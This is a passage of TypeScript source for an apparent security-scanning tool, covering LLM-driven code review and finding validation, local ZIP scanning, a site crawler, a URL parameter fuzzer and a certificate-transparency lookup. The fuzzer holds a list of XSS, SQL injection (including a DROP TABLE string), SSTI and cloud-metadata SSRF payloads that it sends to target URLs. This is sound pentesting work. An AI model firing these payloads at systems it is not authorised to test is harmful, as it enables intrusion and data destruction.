6. **Chain findings** — an IDOR + a logic flaw can be a privilege escalation. An information leak + a weak token + a CSRF can be an account takeover. Surface these chains explicitly.

## Language-Specific Danger Zones
- **Node.js / TypeScript**: prototype pollution (\`__proto__\`, \`constructor.prototype\`, lodash \`merge\`/\`set\` with user keys), \`eval()\`/\`Function(src)()\`/\`vm.runInContext\`, \`child_process.exec/execSync\` with user input, \`path.join\` with unsanitized segments that can escape roots, regex ReDoS, JWT \`none\` algorithm, \`JSON.parse\` of user input piped to dangerous calls
- **Python**: \`pickle.loads\`/\`shelve\`/\`marshal\`, \`yaml.load\` (not \`safe_load\`), \`eval()\`/\`exec()\`, \`subprocess\` with \`shell=True\`, \`os.system\`/\`os.popen\`, Jinja2 \`render_template_string\` with user data, \`__import__\`, unsafe XML parsers (ElementTree without defusedxml)
- **Java**: \`Runtime.exec\`, \`ProcessBuilder\` with user input, Java deserialization (\`ObjectInputStream.readObject\`), JNDI injection, SpEL/OGNL injection in Spring/Struts, \`Class.forName\` with user input, XXE via unpatched XML parsers
- **PHP**: \`eval()\`, \`system()\`/\`exec()\`/\`passthru()\`, file include with user input, \`unserialize()\`, \`extract()\`, \`$$var\` variable variables, \`preg_replace\` with /e modifier, type juggling in loose comparisons
- **Go**: \`os/exec\` with unsanitized args, SQL via \`fmt.Sprintf\` instead of parameterized queries, \`text/template\` (unsafe) vs \`html/template\` (safe) confusion
- **Ruby**: \`eval\`/\`instance_eval\`/\`class_eval\`, \`send\` with user input, \`YAML.load\` (not \`safe_load\`), \`open()\` with user input (potential RCE), system commands via backtick/\`%x{}\`

## Quality Bar — What NOT to Report
- Missing rate limiting alone (only if it enables a concrete attack with demonstrable impact)
- Theoretical vulnerabilities you cannot trace from a realistic attacker-controlled source to a dangerous sink
- Issues that require physical machine access or pre-existing admin privileges beyond the threat model
- Code quality concerns with no security impact

Every finding must have: (1) a concrete attacker-controlled source, (2) an identifiable dangerous sink, (3) a traceable path between them, (4) a specific PoC that a security engineer could use to reproduce it. Missing any of the four = do not include the finding.`;
      const userPrompt = `Repository under audit: ${url}
Source files reviewed (${chunks.length} files, ${totalChars} chars):

${chunks.join('\n\n')}

---
Security focus: ${focusDesc[focus] ?? focusDesc.all}

Review this code for exploitable security vulnerabilities. Think through:
1. Where does untrusted/attacker-controlled input enter this codebase? (HTTP params, headers, cookies, file content, env vars, DB values from user-controlled tables)
2. Which dangerous sinks exist? (SQL execution, shell commands, template rendering, eval, deserialization, file writes, redirects)
3. Can you trace a complete path from any entry point to any sink without adequate sanitization?
4. Are auth/authz checks present for sensitive operations? Can they be bypassed or skipped?
5. Are there logic flaws — race conditions, missing ownership checks, IDOR, mass assignment?
6. Can any combination of findings form a higher-severity attack chain?

Report only findings you can trace completely from source to sink with a concrete PoC.

Return ONLY this JSON (no prose before or after):
{"findings":[{"title":"concise name","severity":"critical|high|medium|low","confidence":"high|medium","file":"path/from/repo/root","line":123,"description":"what is vulnerable and why — include where the attacker-controlled input originates","attack_vector":"step-by-step: specific input → how it propagates → which dangerous sink it reaches → what the attacker achieves","poc":"exact payload, parameter name, API endpoint, or sequence of calls that reproduces the issue"}]}

Only include findings with confidence 'high' or 'medium'. Skip anything you cannot fully trace.`;

      let raw: string;
      try {
        raw = await llm.prompt(userPrompt, systemPrompt, { maxTokens: 8192 });
      } catch (e: unknown) {
        return { success: false, error: `LLM call failed: ${(e as Error).message}` };
      }

      // Detect soft-refusals: model produced prose instead of JSON (safety filter, hallucination, etc.)
      if (!raw.includes('"findings"')) {
        return { success: false, error: `llm_code_review: model did not return findings JSON. Response preview: ${raw.slice(0, 200)}` };
      }

      const findings = parseLLMFindings(raw, url, clonePath);
      const cmd = `llm_code_review(url="${url}", focus="${focus}", files=${chunks.length}, chars=${totalChars})`;

      return {
        success: true,
        output: findings.length > 0
          ? `LLM semantic review: ${findings.length} issue(s) in ${url} (${chunks.length} files, ${totalChars} chars)\n` +
            findings.slice(0, 5).map(f => `  [${f.severity.toUpperCase()}] ${f.title} — ${f.toolOutput ?? ''}`).join('\n')
          : `LLM semantic review: no exploitable issues found in ${url} (${chunks.length} files analyzed)`,
        findings: findings.length > 0 ? findings : undefined,
        additionalEvidence: [{
          type: 'command' as const,
          content: cmd,
          metadata: { tool: 'llm_code_review', filesReviewed: chunks.length, charsReviewed: totalChars },
        }],
      };
    },
  },
  {
    name: 'llm_validate_finding',
    description: 'Deep LLM validation of a specific finding — traces data flow, confirms exploitability with context, generates PoC',
    category: 'code',
    parameters: [
      { name: 'url', type: 'string', description: 'Repository URL (to locate cloned copy)', required: true },
      { name: 'file', type: 'string', description: 'File path relative to repo root', required: true },
      { name: 'line', type: 'number', description: 'Line number of the vulnerability', required: true },
      { name: 'description', type: 'string', description: 'Finding description to validate', required: true },
      { name: 'title', type: 'string', description: 'Finding title', required: false, default: '' },
    ],
    handler: async (context) => {
      const llm = context.llm as LLMBackbone | undefined;
      if (!llm) return { success: false, error: 'llm_validate_finding requires an LLM backbone — set API key in Settings' };

      const url = String(context.parameters.url ?? '').trim();
      const file = String(context.parameters.file ?? '').trim();
      const line = Number(context.parameters.line) || 0;
      const description = String(context.parameters.description ?? '').trim();
      const title = String(context.parameters.title || description.slice(0, 80)).trim();

      const clonePath = (await resolveOrPreparePath(url)) ?? (() => {
        if (url.startsWith('local://')) return null; // no fallback for local — we can't synthesize a path
        const slug = Buffer.from(url).toString('base64url').slice(0, 40).replace(/[^a-z0-9]/gi, '_');
        return `/tmp/t3mp3st-repo-${slug}`;
      })();
      if (!clonePath) return { success: false, error: `Local target not found for ${url} — run local_code_scan first` };
      let relFile = file.replace(/^\//, '');
      let fullPath = relFile ? pathJoin(clonePath, relFile) : '';

      if (relFile && !existsSync(fullPath)) {
        // Path doesn't resolve — search by basename. Handles:
        //   - Bare filenames: "fileUpload.ts"
        //   - Wrong prefix: "src/app/foo.ts" when the repo has "frontend/src/app/foo.ts"
        const basename = pathJoin(relFile).split('/').pop() ?? '';
        if (basename && existsSync(clonePath)) {
          try {
            const findResult = await runSubprocess('find', [
              clonePath, '-name', basename, '-type', 'f',
              '-not', '-path', '*/node_modules/*',
              '-not', '-path', '*/.git/*',
            ], { timeout: 5000, maxOutput: 2000 });
            const candidates = (findResult.stdout ?? '').trim().split('\n').filter(Boolean);
            if (candidates.length > 0) {
              // When multiple matches exist, prefer the one whose path shares the most
              // segments with the originally reported path (e.g. "src/app/foo.ts" best
              // matches "frontend/src/app/foo.ts" over "test/app/foo.ts").
              const segments = relFile.split('/');
              const best = candidates.sort((a, b) => {
                const scoreA = segments.filter(s => a.includes(s)).length;
                const scoreB = segments.filter(s => b.includes(s)).length;
                return scoreB - scoreA;
              })[0];
              fullPath = best;
              relFile = best.replace(clonePath + '/', '');
            }
          } catch { /* search failed — fall through */ }
        }
        if (!existsSync(fullPath)) {
          return { success: false, error: `File not found: ${file} (repo cloned at ${clonePath}?)` };
        }
      }

      // Empty file path — validate conceptually from description alone (no source context)
      if (!relFile) {
        const systemPrompt = `You are a skeptical security reviewer. Validate the reported finding based on its description alone — no source code is available.`;
        const userPrompt = `Finding: ${title}\nDescription: ${description}\n\nReturn ONLY valid JSON:\n{"verdict":"CONFIRMED|FALSE_POSITIVE|NEEDS_MORE_INFO","confidence":0-100,"finding_type":"injection|hardcoded_secret|insecure_crypto|missing_control|other","attack_conditions":"","data_flow":"","poc":"","reasoning":""}`;
        let raw2: string;
        try { raw2 = await llm.prompt(userPrompt, systemPrompt, { maxTokens: 512 }); }
        catch (e: unknown) { return { success: false, error: `LLM call failed: ${(e as Error).message}` }; }
        const v2 = parseValidationJSON(raw2);
        const verdict2 = String(v2.verdict ?? 'NEEDS_MORE_INFO');
        const confidence2 = Number(v2.confidence ?? 40);
        const isFP2 = verdict2 === 'FALSE_POSITIVE';
        return {
          success: true,
          output: `${verdict2} (${confidence2}%, no source) — ${title}`,
          findings: !isFP2 ? [{ title: `[${verdict2}] ${title}`, severity: 'medium' as const, details: String(v2.reasoning ?? ''), provenance: 'tool' as const, toolName: 'llm_validate_finding', toolOutput: `${verdict2} (${confidence2}%)`, scanCommand: `llm_validate_finding: ${title} (no file)`, scanOutput: String(v2.reasoning ?? '') }] : [],
        };
      }

      let annotated = '';
      try {
        const ls = readFileSync(fullPath, 'utf8').split('\n');
        const from = Math.max(0, line - 80);
        const to = Math.min(ls.length, line + 80);
        annotated = ls.slice(from, to)
          .map((l, i) => {
            const n = from + i + 1;
            return `${String(n).padStart(4)}${n === line ? ' ← ' : '   '}${l}`;
          })
          .join('\n');
      } catch (e: unknown) {
        return { success: false, error: `Cannot read file: ${(e as Error).message}` };
      }

      // Best-effort: find call sites for the function near the vulnerable line
      let callSites = '';
      const fnName = extractFunctionNear(fullPath, line);
      if (fnName) {
        try {
          const grepResult = await runSubprocess('grep', ['-rn', '--include=*.ts', '--include=*.js', '--include=*.go', '--include=*.py', '--include=*.rb', '--include=*.java', fnName, clonePath], { timeout: 5000, maxOutput: 4000 });
          const hits = (grepResult.stdout ?? '').split('\n')
            .filter(l => !l.includes(relFile) && l.trim())
            .slice(0, 10);
          if (hits.length > 0) {
            callSites = `\nCall sites for "${fnName}":\n${hits.map(l => l.replace(clonePath + '/', '')).join('\n')}`;
          }
        } catch { /* skip — best effort */ }
      }

      const systemPrompt = `You are a skeptical security reviewer validating reported findings. Apply the right standard for each finding type:

INJECTION / DATA-FLOW (SQLi, SSRF, XSS, XXE, RCE, path traversal, deserialization, command injection): CONFIRM only if you can trace attacker-controlled input to the vulnerable sink with no effective sanitization. If the path is plausible but incomplete, use NEEDS_MORE_INFO rather than FALSE_POSITIVE.

HARDCODED SECRETS (private keys, RSA keys, JWT secrets, HMAC keys, API tokens, wallet mnemonics, passwords): CONFIRM if the secret is literally present in the source — the presence IS the vulnerability, no data-flow trace needed.

INSECURE CRYPTOGRAPHY (weak algorithm, hardcoded IV, predictable seed, JWT alg:none): CONFIRM if the insecure usage is directly visible in the code.

MISSING CONTROLS (absent CSRF protection, absent rate limiting, insecure storage, missing auth check): CONFIRM if you can verify the control is demonstrably absent or bypassed in the code shown.

Default to NEEDS_MORE_INFO when uncertain rather than FALSE_POSITIVE — a finding is FALSE_POSITIVE only when you have clear evidence it cannot be exploited or the issue does not exist.`;

      const userPrompt = `Finding to validate:
Title: ${title}
Description: ${description}
Location: ${relFile}:${line}

Source code (line ${line} marked with ←):
\`\`\`
${annotated}
\`\`\`
${callSites}

Validate this finding using the standard appropriate for its type (see system prompt).

Return ONLY valid JSON (no prose):
{"verdict":"CONFIRMED|FALSE_POSITIVE|NEEDS_MORE_INFO","confidence":0-100,"finding_type":"injection|hardcoded_secret|insecure_crypto|missing_control|other","attack_conditions":"what attacker needs or what makes this a true positive","data_flow":"for injection vulns: RequestParam X → handler fn:line → sink:${line}; for others: describe why the issue is confirmed","poc":"curl command, payload, or step-by-step if applicable","reasoning":"concise explanation of your determination"}`;

      let raw: string;
      try {
        raw = await llm.prompt(userPrompt, systemPrompt, { maxTokens: 2048 });
      } catch (e: unknown) {
        return { success: false, error: `LLM call failed: ${(e as Error).message}` };
      }

      const v = parseValidationJSON(raw);
      const verdict = String(v.verdict ?? 'NEEDS_MORE_INFO');
      const confidence = Number(v.confidence ?? 50);
      const dataFlow = String(v.data_flow ?? '');
      const conditions = String(v.attack_conditions ?? '');
      const poc = String(v.poc ?? '');
      const reasoning = String(v.reasoning ?? raw.slice(0, 500));

      const scanOutput = [
        `Verdict: ${verdict} (${confidence}% confidence)`,
        dataFlow ? `Data flow: ${dataFlow}` : '',
        conditions ? `Conditions: ${conditions}` : '',
        poc ? `\nPoC:\n${poc}` : '',
        `\nReasoning: ${reasoning}`,
      ].filter(Boolean).join('\n');

      const isFP = verdict === 'FALSE_POSITIVE';
      const isConfirmed = verdict === 'CONFIRMED';

      return {
        success: true,
        output: `${verdict} (${confidence}%) — ${title}\n${reasoning.slice(0, 300)}`,
        findings: !isFP ? [{
          title: `[${verdict}] ${title}`,
          severity: (isConfirmed && confidence >= 80 ? 'high' : 'medium') as 'high' | 'medium',
          details: scanOutput,
          provenance: 'tool' as const,
          toolName: 'llm_validate_finding',
          toolOutput: `${verdict} (${confidence}%): ${reasoning.slice(0, 200)}`,
          scanCommand: `llm_validate_finding: ${file}:${line}`,
          scanOutput,
        }] : undefined,
      };
    },
  },

  // ===========================================================================
  // LOCAL CODE SCAN — accepts a ZIP or pre-extracted folder from /data/uploads/
  // Works identically to the git clone pipeline: enumerate with local_code_scan,
  // then run semgrep_scan / gitleaks_scan / trivy_scan / llm_code_review using
  // the same local:// URL as the 'url' parameter.
  // ===========================================================================
  {
    name: 'local_code_scan',
    description: 'Enumerate a local ZIP file or folder in /data/uploads/ — extracts ZIPs on demand, reports file structure. Use the returned local:// URL with semgrep_scan, gitleaks_scan, trivy_scan, and llm_code_review.',
    category: 'code',
    parameters: [
      { name: 'path', type: 'string', description: 'Target name or local:// URL — the ZIP filename or extracted folder name under /data/uploads/ (e.g. "local://my-project" or "my-project")', required: true },
    ],
    handler: async (context) => {
      const rawPath = String(context.parameters.path || '').trim();
      if (!rawPath) return { success: false, error: 'path parameter required' };

      // Normalize: strip local:// prefix and any /data/uploads/ prefix
      let name = rawPath.startsWith('local://') ? rawPath.slice(8) : rawPath;
      name = name.replace(/^\/data\/uploads\//, '');
      // Remove .zip extension — we'll look for both
      const nameNoExt = name.replace(/\.zip$/i, '');

      // Security: reject path traversal
      if (!nameNoExt || nameNoExt.includes('/') || nameNoExt.includes('..') || nameNoExt.includes('\0')) {
        return { success: false, error: 'Invalid path: must be a plain name with no slashes or traversal sequences' };
      }

      const uploadsDir = '/data/uploads';
      const extractedPath = `${uploadsDir}/${nameNoExt}`;
      const zipPath = `${uploadsDir}/${nameNoExt}.zip`;

      // Extract ZIP if the directory doesn't exist yet
      if (!existsSync(extractedPath)) {
        if (!existsSync(zipPath)) {
          return { success: false, error: `No target found for local://${nameNoExt} — upload a ZIP or ensure the folder exists in /data/uploads/` };
        }
        try {
          const mkResult = await runSubprocess('mkdir', ['-p', extractedPath], { timeout: 5000 });
          if (mkResult.exitCode !== 0) {
            return { success: false, error: `Failed to create extraction directory: ${mkResult.stderr.slice(0, 300)}` };
          }
          const unzipResult = await runSubprocess('unzip', ['-q', '-o', zipPath, '-d', extractedPath], { timeout: 120000 });
          if (unzipResult.exitCode !== 0) {
            return { success: false, error: `ZIP extraction failed: ${unzipResult.stderr.slice(0, 500)}` };
          }
        } catch (err) {
          return { success: false, error: `Extraction error: ${err instanceof Error ? err.message : String(err)}` };
        }
      }

      // Enumerate source files (mirrors git_clone_analyze logic)
      const fileResult = await runSubprocess('find', [
        extractedPath, '-type', 'f',
        '(', '-name', '*.ts', '-o', '-name', '*.js', '-o', '-name', '*.py',
              '-o', '-name', '*.php', '-o', '-name', '*.go', '-o', '-name', '*.rs',
              '-o', '-name', '*.java', '-o', '-name', '*.rb', '-o', '-name', '*.cs',
              '-o', '-name', '*.c', '-o', '-name', '*.cpp', '-o', '-name', '*.sol', ')',
        '-not', '-path', '*/node_modules/*', '-not', '-path', '*/.git/*',
      ], { timeout: 30000, maxOutput: 50000 });

      const sourceFiles = fileResult.stdout.split('\n').filter(Boolean);
      const langCounts: Record<string, number> = {};
      for (const f of sourceFiles) {
        const ext = f.split('.').pop()?.toLowerCase() || '';
        langCounts[ext] = (langCounts[ext] || 0) + 1;
      }

      const configFiles: string[] = [];
      for (const cfg of ['package.json', 'requirements.txt', 'go.mod', 'Gemfile', 'pom.xml', 'build.gradle',
                          'docker-compose.yml', 'Dockerfile', '.env.example', '.github/workflows']) {
        if (existsSync(pathJoin(extractedPath, cfg))) configFiles.push(cfg);
      }

      const langSummary = Object.entries(langCounts)
        .sort((a, b) => b[1] - a[1])
        .map(([ext, n]) => `${ext}(${n})`)
        .join(', ');

      const localUrl = `local://${nameNoExt}`;
      const output = [
        `Local target ready: ${localUrl}`,
        `Scan path: ${extractedPath}`,
        `Source files: ${sourceFiles.length} (${langSummary || 'none'})`,
        configFiles.length ? `Config files found: ${configFiles.join(', ')}` : 'No notable config files',
        `\nUse url="${localUrl}" with semgrep_scan, gitleaks_scan, trivy_scan, and llm_code_review.`,
      ].join('\n');

      return {
        success: true,
        output,
        findings: [{
          title: 'Local Code Target Enumerated',
          severity: 'info',
          details: output,
          provenance: 'tool',
          toolName: 'local_code_scan',
          toolOutput: output,
        }],
      };
    },
  },

  // ===========================================================================
  // NEW SECURITY SCANNING TOOLS
  // ===========================================================================
  {
    name: 'site_spider',
    description: 'Crawl a website from a starting URL, extract internal links, forms, and URL parameters. Scope controls which hosts are followed.',
    category: 'web',
    parameters: [
      { name: 'url', type: 'string', description: 'Starting URL to crawl', required: true },
      { name: 'depth', type: 'number', description: 'Maximum crawl depth (default: 2)', required: false, default: 2 },
      { name: 'max_pages', type: 'number', description: 'Maximum pages to visit (default: 50, max: 200)', required: false, default: 50 },
      { name: 'scope', type: 'string', description: 'Crawl scope: "strict" (same origin only), "subdomains" (all subdomains of base domain), or comma-separated list of allowed hostnames (default: strict)', required: false, default: 'strict' },
    ],
    handler: async (context) => {
      const startUrl = String(context.parameters.url).trim();
      const maxDepth = Number(context.parameters.depth ?? 2);
      const maxPages = Math.min(Number(context.parameters.max_pages ?? 50), 200);
      const scopeParam = String(context.parameters.scope ?? 'strict').trim().toLowerCase();

      let startParsed: URL;
      try {
        startParsed = new URL(startUrl);
      } catch {
        return { success: false, error: `Invalid URL: ${startUrl}` };
      }

      const origin = startParsed.origin;
      // Extract base domain (last two labels, or full hostname for IPs)
      const hostname = startParsed.hostname;
      const baseDomain = hostname.split('.').length > 2
        ? hostname.split('.').slice(-2).join('.')
        : hostname;

      // Build scope predicate
      let inScope: (u: URL) => boolean;
      if (scopeParam === 'strict') {
        inScope = (u) => u.origin === origin;
      } else if (scopeParam === 'subdomains') {
        inScope = (u) => u.hostname === hostname || u.hostname.endsWith(`.${baseDomain}`);
      } else {
        // Comma-separated explicit allowlist
        const allowed = new Set(scopeParam.split(',').map(s => s.trim()).filter(Boolean));
        inScope = (u) => allowed.has(u.hostname) || allowed.has(u.origin);
      }

      const visited = new Set<string>();
      const queue: Array<{ url: string; depth: number }> = [{ url: startUrl, depth: 0 }];
      const urlsWithParams: Map<string, string[]> = new Map();
      const forms: Array<{ page: string; action: string; method: string; fields: string[] }> = [];
      const internalLinks = new Set<string>();
      const outOfScopeLinks = new Set<string>();

      const extractLinks = (html: string, pageUrl: string): string[] => {
        const links: string[] = [];
        const hrefRegex = /href=["']([^"'#]+)["']/gi;
        const actionRegex = /action=["']([^"']+)["']/gi;
        let m: RegExpExecArray | null;
        while ((m = hrefRegex.exec(html)) !== null) links.push(m[1]);
        while ((m = actionRegex.exec(html)) !== null) links.push(m[1]);
        return links.map(h => {
          try {
            return new URL(h, pageUrl).href;
          } catch { return ''; }
        }).filter(Boolean);
      };

      const extractForms = (html: string, pageUrl: string): void => {
        const formRegex = /<form[^>]*action=["']?([^"'\s>]*)["']?[^>]*method=["']?([^"'\s>]*)["']?[^>]*>([\s\S]*?)<\/form>/gi;
        let m: RegExpExecArray | null;
        while ((m = formRegex.exec(html)) !== null) {
          const action = m[1] || pageUrl;
          const method = (m[2] || 'GET').toUpperCase();
          const body = m[3];
          const fieldRegex = /name=["']([^"']+)["']/gi;
          const fields: string[] = [];
          let fm: RegExpExecArray | null;
          while ((fm = fieldRegex.exec(body)) !== null) fields.push(fm[1]);
          let actionUrl = '';
          try { actionUrl = new URL(action, pageUrl).href; } catch { actionUrl = action; }
          forms.push({ page: pageUrl, action: actionUrl, method, fields });
        }
      };

      while (queue.length > 0 && visited.size < maxPages) {
        const item = queue.shift();
        if (!item) break;
        const { url: pageUrl, depth } = item;
        if (visited.has(pageUrl)) continue;
        visited.add(pageUrl);

        try {
          const parsed = new URL(pageUrl);
          const params = Array.from(parsed.searchParams.keys());
          if (params.length > 0) urlsWithParams.set(pageUrl, params);

          const resp = await fetch(pageUrl, {
            signal: AbortSignal.timeout(8000),
            headers: { 'User-Agent': 'Mozilla/5.0 (compatible; SecurityScanner/1.0)' },
            redirect: 'follow',
          });
          const ct = resp.headers.get('content-type') ?? '';
          if (!ct.includes('html')) continue;
          const html = await resp.text();

          extractForms(html, pageUrl);

          if (depth < maxDepth) {
            const links = extractLinks(html, pageUrl);
            for (const link of links) {
              try {
                const lu = new URL(link);
                if (inScope(lu) && !visited.has(link)) {
                  internalLinks.add(link);
                  queue.push({ url: link, depth: depth + 1 });
                } else if (!inScope(lu)) {
                  outOfScopeLinks.add(lu.hostname);
                }
              } catch { /* skip invalid */ }
            }
          }
        } catch { /* network error — skip */ }
      }

      const paramList = Array.from(urlsWithParams.entries())
        .map(([u, p]) => `  ${u} → [${p.join(', ')}]`)
        .join('\n');
      const formList = forms.map(f =>
        `  ${f.page}: action=${f.action} method=${f.method} fields=[${f.fields.join(', ')}]`
      ).join('\n');
      const scopeDesc = scopeParam === 'strict'
        ? `strict (origin: ${origin})`
        : scopeParam === 'subdomains'
          ? `subdomains (base: ${baseDomain})`
          : `custom allowlist: ${scopeParam}`;
      const oosNote = outOfScopeLinks.size > 0
        ? `Out-of-scope hosts encountered (not crawled): ${Array.from(outOfScopeLinks).join(', ')}`
        : 'No out-of-scope links encountered';

      return {
        success: true,
        output: [
          `Site Spider Results for ${startUrl}`,
          `Scope: ${scopeDesc}`,
          `Pages visited: ${visited.size} (depth limit: ${maxDepth}, page limit: ${maxPages})`,
          `Unique in-scope links: ${internalLinks.size}`,
          oosNote,
          `URLs with parameters (${urlsWithParams.size}):`,
          paramList || '  (none)',
          `Forms found (${forms.length}):`,
          formList || '  (none)',
        ].join('\n'),
        findings: urlsWithParams.size > 0 ? [{
          title: 'URL Parameters Discovered',
          severity: 'info' as const,
          details: `Found ${urlsWithParams.size} URLs with query parameters across ${visited.size} pages. These are candidates for injection testing.`,
          provenance: 'tool' as const,
          toolName: 'site_spider',
          toolOutput: paramList,
        }] : undefined,
      };
    },
  },
  {
    name: 'param_fuzz',
    description: 'Fuzz URL parameters with XSS/SQLi/SSRF/SSTI payloads',
    category: 'vuln',
    parameters: [
      { name: 'url', type: 'string', description: 'URL with query parameters to fuzz', required: true },
      { name: 'params', type: 'string', description: 'Comma-separated param names to fuzz (blank = fuzz all)', required: false, default: '' },
      { name: 'mode', type: 'string', description: 'Payload mode: xss|sqli|ssrf|ssti|all', required: false, default: 'all' },
    ],
    handler: async (context) => {
      const rawUrl = String(context.parameters.url).trim();
      const paramsCsv = String(context.parameters.params ?? '').trim();
      const mode = String(context.parameters.mode ?? 'all').toLowerCase();

      let baseUrl: URL;
      try { baseUrl = new URL(rawUrl); } catch { return { success: false, error: `Invalid URL: ${rawUrl}` }; }

      const allParams = Array.from(baseUrl.searchParams.keys());
      const targetParams = paramsCsv
        ? paramsCsv.split(',').map(p => p.trim()).filter(Boolean)
        : allParams.slice(0, 10);

      if (targetParams.length === 0) {
        return { success: false, error: 'No parameters found in URL and none specified. Provide a URL with query params or specify params.' };
      }

      type PayloadSet = { xss: string[]; sqli: string[]; ssrf: string[]; ssti: string[] };
      const payloads: PayloadSet = {
        xss: ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>', "';alert(1)//", '<svg onload=alert(1)>'],
        sqli: ["'", "' OR '1'='1", "' OR 1=1--", "'; DROP TABLE users--", "1 AND 1=2 UNION SELECT NULL--"],
        ssrf: ['http://169.254.169.254/latest/meta-data/', 'http://127.0.0.1/', 'http://[::1]/'],
        ssti: ['{{7*7}}', '${7*7}', '<%= 7*7 %>', '#{7*7}'],
      };

      const activePayloads: string[] = [];
      if (mode === 'all' || mode === 'xss') activePayloads.push(...payloads.xss);
      if (mode === 'all' || mode === 'sqli') activePayloads.push(...payloads.sqli);
      if (mode === 'all' || mode === 'ssrf') activePayloads.push(...payloads.ssrf);
      if (mode === 'all' || mode === 'ssti') activePayloads.push(...payloads.ssti);

      const limitedPayloads = activePayloads.slice(0, 15);

      const findings: NonNullable<ToolResult['findings']> = [];
      const results: string[] = [];

      const sqlErrors = ['sql syntax', 'mysql_fetch', 'ora-01', 'postgresql', 'sqlite_', 'you have an error in your sql', 'unclosed quotation', 'sqlstate'];
      const metadataMarkers = ['ami-id', 'instance-id', 'local-ipv4', 'computemetadata', 'aws_secret'];

      for (const param of targetParams.slice(0, 10)) {
        for (const payload of limitedPayloads) {
          const testUrl = new URL(rawUrl);
          testUrl.searchParams.set(param, payload);
          const urlStr = testUrl.href;
          try {
            const resp = await fetch(urlStr, {
              signal: AbortSignal.timeout(5000),
              headers: { 'User-Agent': 'Mozilla/5.0 (compatible; T3MP3ST-Fuzz/1.0)' },
            });
            const body = await resp.text();
            const bodyLower = body.toLowerCase();
            const ct = resp.headers.get('content-type') ?? '';
            const hostHeader = testUrl.hostname;

            const buildFuzzPacket = (marker: string) => {
              const matchIdx = body.indexOf(marker);
              const snippet = matchIdx >= 0
                ? body.slice(Math.max(0, matchIdx - 60), matchIdx + marker.length + 60).replace(/\s+/g, ' ')
                : body.slice(0, 200).replace(/\s+/g, ' ');
              return {
                req: `GET ${urlStr}\nHost: ${hostHeader}\nUser-Agent: T3MP3ST-Fuzz/1.0`,
                resp: `HTTP/1.1 ${resp.status}\nContent-Type: ${ct}\n\n...${snippet}...`,
              };
            };

            // XSS: payload reflected unencoded
            if ((mode === 'all' || mode === 'xss') && payloads.xss.includes(payload)) {
              if (body.includes(payload)) {
                results.push(`XSS REFLECTED: param=${param} payload=${payload}`);
                const pkt = buildFuzzPacket(payload);
                findings.push({
                  title: `Reflected XSS in parameter: ${param}`,
                  severity: 'high' as const,
                  details: `Parameter "${param}" reflects payload unencoded: ${payload}`,
                  provenance: 'tool' as const,
                  toolName: 'param_fuzz',
                  toolOutput: `URL: ${urlStr}`,
                  httpRequest: pkt.req,
                  httpResponse: pkt.resp,
                });
              }
            }

            // SQLi: SQL error strings in response
            if ((mode === 'all' || mode === 'sqli') && payloads.sqli.includes(payload)) {
              if (sqlErrors.some(e => bodyLower.includes(e))) {
                results.push(`SQLi ERROR: param=${param} payload=${payload}`);
                const errMarker = sqlErrors.find(e => bodyLower.includes(e)) ?? '';
                const pkt = buildFuzzPacket(errMarker);
                findings.push({
                  title: `SQL Injection (Error-Based) in parameter: ${param}`,
                  severity: 'critical' as const,
                  details: `SQL error triggered by payload "${payload}" in parameter "${param}"`,
                  provenance: 'tool' as const,
                  toolName: 'param_fuzz',
                  toolOutput: `URL: ${urlStr}`,
                  httpRequest: pkt.req,
                  httpResponse: pkt.resp,
                });
              }
            }

            // SSTI: {{7*7}} → 49 in body (legacy fuzz; dedicated ssti_test uses larger numbers)
            if ((mode === 'all' || mode === 'ssti') && payload === '{{7*7}}') {
              if (body.includes('49') && !body.includes('{{7*7}}')) {
                results.push(`SSTI LIKELY: param=${param} payload={{7*7}} → 49 in response`);
                const pkt = buildFuzzPacket('49');
                findings.push({
                  title: `Server-Side Template Injection in parameter: ${param}`,
                  severity: 'critical' as const,
                  details: `SSTI likely: {{7*7}} absent from response but 49 present in parameter "${param}". Confirm with ssti_test tool.`,
                  provenance: 'tool' as const,
                  toolName: 'param_fuzz',
                  toolOutput: `URL: ${urlStr}`,
                  httpRequest: pkt.req,
                  httpResponse: pkt.resp,
                });
              }
            }

            // SSRF: cloud metadata markers in response
            if ((mode === 'all' || mode === 'ssrf') && payloads.ssrf.includes(payload)) {
              if (metadataMarkers.some(m => bodyLower.includes(m))) {
                results.push(`SSRF CONFIRMED: param=${param} payload=${payload} — metadata markers found`);
                const hit = metadataMarkers.find(m => bodyLower.includes(m)) ?? '';
                const pkt = buildFuzzPacket(hit);
                findings.push({
                  title: `SSRF in parameter: ${param}`,
                  severity: 'critical' as const,
                  details: `SSRF confirmed: cloud metadata markers found when injecting "${payload}" into parameter "${param}"`,
                  provenance: 'tool' as const,
                  toolName: 'param_fuzz',
                  toolOutput: `URL: ${urlStr}`,
                  httpRequest: pkt.req,
                  httpResponse: pkt.resp,
                });
              }
            }
          } catch { /* network error */ }
        }
      }

      return {
        success: true,
        output: [
          `Parameter Fuzzing Results for ${rawUrl}`,
          `Parameters tested: ${targetParams.slice(0, 10).join(', ')}`,
          `Payloads per param: ${limitedPayloads.length} (mode: ${mode})`,
          `Findings: ${findings.length}`,
          results.length > 0 ? results.join('\n') : 'No confirmed vulnerabilities detected.',
        ].join('\n'),
        findings: findings.length > 0 ? findings : undefined,
      };
    },
  },
  {
    name: 'cert_transparency',
    description: 'Query crt.sh CT logs for all certificates ever issued to a domain',
    category: 'recon',
    parameters: [
      { name: 'domain', type: 'string', description: 'Domain to query CT logs for', required: true },
    ],
    handler: async (context) => {
      const domain = String(context.parameters.domain).trim().toLowerCase();
      // Query both wildcard subdomains and the exact domain to maximize coverage
      const ctUrl = `https://crt.sh/?q=%25.${encodeURIComponent(domain)}&output=json`;

      let raw: string;
      try {
        const resp = await fetch(ctUrl, {
          signal: AbortSignal.timeout(30000),
          headers: {
            'User-Agent': 'Mozilla/5.0 (compatible; SecurityScanner/1.0)',
            'Accept': 'application/json',
          },
        });
        if (!resp.ok) return { success: false, error: `crt.sh returned HTTP ${resp.status}` };
        raw = await resp.text();
      } catch (e: unknown) {
        return { success: false, error: `crt.sh query failed: ${(e as Error).message}` };
      }

      let entries: Array<{ name_value?: string; common_name?: string }> = [];
      try { entries = JSON.parse(raw) as typeof entries; } catch {
        return { success: false, error: 'Failed to parse crt.sh JSON response' };
      }

      const subdomains = new Set<string>();
      for (const e of entries) {
        const raw_names = (e.name_value ?? '').split('\n');
        raw_names.push(e.common_name ?? '');
        for (const n of raw_names) {
          const cleaned = n.trim().replace(/^\*\./, '').toLowerCase();
          if (cleaned && cleaned.endsWith(`.${domain}`) || cleaned === domain) {
